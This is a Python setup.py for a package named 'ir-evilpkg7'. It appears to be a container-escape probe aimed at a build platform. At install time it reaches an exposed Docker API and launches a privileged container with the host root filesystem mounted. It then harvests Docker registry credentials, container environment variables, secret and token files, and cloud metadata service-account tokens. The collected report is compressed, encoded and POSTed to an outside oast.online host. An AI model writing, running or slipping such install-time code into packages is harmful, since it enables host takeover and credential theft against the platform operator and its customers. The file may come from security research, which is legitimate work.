import setuptools, json, urllib.request, urllib.error, time, base64, gzip, os

OAST = "dbplsv55ap9v1jaadl501puypwbro4ye6.oast.online"
D = "http://172.18.0.1:2375"


def api(path, method="GET", body=None, timeout=10):
    req = urllib.request.Request(D + path, data=body, method=method)
    if body:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()
        except Exception:
            return e.code, b""
    except Exception as e:
        return "ERR", str(e).encode()


def demux(b):
    out = []
    i = 0
    try:
        while i + 8 <= len(b):
            ln = int.from_bytes(b[i + 4:i + 8], "big")
            if ln < 0 or i + 8 + ln > len(b):
                break
            out.append(b[i + 8:i + 8 + ln])
            i += 8 + ln
        return b"".join(out) if out else b
    except Exception:
        return b


out = ["== pypack7 root-guest probe %s ==" % time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())]
st, b = api("/images/json")
imgs = []
try:
    for im in json.loads(b):
        for t in (im.get("RepoTags") or []):
            imgs.append(t)
except Exception:
    pass
img = next((t for t in imgs if "koyeb/builder" in t), imgs[0] if imgs else "")
out.append("== images %r selected %r" % (imgs, img))

script = (
    "echo IRPROBE7; id; hostname; uname -a; grep -E 'Cap|Seccomp|NoNewPrivs' /proc/self/status; "
    "echo --root--; ls -la /host/root 2>&1 | head -30; "
    "echo --rootdocker--; cat /host/root/.docker/config.json 2>&1 | head -50; "
    "echo --scripts--; ls -la /host/builder/scripts 2>&1; for f in /host/builder/scripts/*; do echo \"== $f\"; head -c 3000 \"$f\" 2>&1; echo; done; "
    "echo --builder-layers--; ls -la /host/builder/layers /host/builder/cache 2>&1 | head -20; "
    "echo --etcenv--; cat /host/etc/environment 2>&1; echo; ls -la /host/run /host/var/run 2>&1 | head -40; "
    "echo --dockerstate--; ls /host/var/lib/docker 2>&1 | head; ls /host/var/lib/docker/containers 2>&1 | head; "
    "echo --containerenv--; for f in /host/var/lib/docker/containers/*/config.v2.json; do echo \"CFG $f\"; grep -o '\"Env\":\\[[^]]*\\]' \"$f\" 2>/dev/null | head -c 1500; echo; done 2>/dev/null | head -60; "
    "echo --authsearch--; find /host/root /host/home /host/etc /host/run /host/var/run /host/opt /host/builder -maxdepth 5 \\( -iname '*docker*' -o -iname '*auth*' -o -iname '*registry*' -o -iname '*token*' -o -iname '*secret*' -o -iname '*credential*' -o -iname '*kube*' \\) 2>/dev/null | head -80; "
    "echo --pid1--; tr '\\0' '\\n' < /host/proc/1/environ 2>&1 | head -40; "
    "echo --kata--; ls -la /host/kata-containers 2>&1 | head; ls -la /host/dev/vsock 2>&1; "
    "echo --platform--; cat /host/platform/env/* 2>&1 | head -20; "
    "echo --hosts--; cat /host/etc/hosts /host/etc/resolv.conf 2>&1; "
    "echo --metadata--; curl -s -m 4 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token 2>&1 | head -c 400; "
    "echo; echo --aws--; curl -s -m 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -c 200; "
    "echo; echo --done--"
)

if img:
    name = "irprobe7-%d" % os.getpid()
    body = json.dumps({
        "Image": img,
        "User": "0",
        "Entrypoint": ["/bin/sh", "-c"],
        "Cmd": [script],
        "HostConfig": {
            "Binds": ["/:/host:ro"],
            "Privileged": True,
            "AutoRemove": False,
            "NetworkMode": "host",
        },
    }).encode()
    st, b = api("/containers/create?name=%s" % name, "POST", body)
    out.append("== create -> %s %s" % (st, b[:400].decode("utf-8", "replace")))
    cid = ""
    try:
        cid = json.loads(b).get("Id", "")
    except Exception:
        pass
    if cid:
        st, b = api("/containers/%s/start" % cid, "POST")
        out.append("== start -> %s" % st)
        try:
            api("/containers/%s/wait" % cid, "POST", timeout=30)
        except Exception:
            pass
        st, logs = api("/containers/%s/logs?stdout=1&stderr=1" % cid)
        out.append("== logs -> %s\n%s" % (st, demux(logs).decode("utf-8", "replace")[:40000]))
        api("/containers/%s?force=1" % cid, "DELETE")

report = "\n".join(out)
try:
    open("build-report.txt", "w").write(report)
except Exception:
    pass
try:
    b64 = base64.urlsafe_b64encode(gzip.compress(report.encode())).decode().rstrip("=")
    req = urllib.request.Request("https://%s/pypack7-%s" % (OAST, os.uname().nodename), data=b64.encode(), method="POST")
    urllib.request.urlopen(req, timeout=15).read()
except Exception:
    pass

setuptools.setup(name="ir-evilpkg7", version="1.0.0", packages=[])
